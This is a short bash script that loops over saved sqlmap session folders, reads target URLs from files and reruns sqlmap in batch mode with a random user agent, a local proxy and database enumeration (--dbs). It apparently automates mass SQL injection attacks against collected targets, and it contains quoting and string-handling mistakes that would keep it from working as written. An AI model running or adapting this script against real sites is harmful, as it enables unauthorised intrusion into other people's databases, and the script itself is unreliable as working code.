#!/bin/bash
i=0 ;
for dir in `find /root/my_scripts/r4bia -type d`;
 do 
   if  ls $dir/session.sqlite > /dev/null 2>&1; then 
       if ! grep "[*]" $dir/log > /dev/null 2>&1; then 
          url=`cat $dir/target.txt | tr -d '(GET)'`; 
          sqlmap='sqlmap --output-dir=${dir%/*} --batch --thread 10  --proxy http://127.0.0.1:3400 --random-agent  --beep --eta --parse-errors  --answers=follow=N --smart -u \"$url\" --dbs --no-cast';
	  echo $sqlmap;
          ${sqlmap};
       fi; 
   fi;
 done
